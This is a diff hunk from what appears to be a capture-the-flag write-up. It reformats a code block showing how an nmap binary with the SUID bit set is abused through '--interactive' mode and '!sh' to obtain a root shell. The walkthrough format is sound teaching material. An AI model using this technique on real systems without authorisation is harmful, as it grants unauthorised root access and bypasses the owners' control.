@@ -248,8 +248,8 @@ The output showed that `nmap` was one of the binaries with the SUID bit set:
 
 `Nmap` in interactive mode can be exploited to gain a root shell. Here’s how I did it:
 ```
-robot@linux:~$ nmap --interactive nmap 
---interactive Starting 
+robot@linux:~$ nmap --interactive 
+nmap --interactive Starting 
 nmap V. 3.81 ( http://www.insecure.org/nmap/ ) Welcome to Interactive Mode -- press h <enter> for help 
 nmap> !sh 
 !sh 
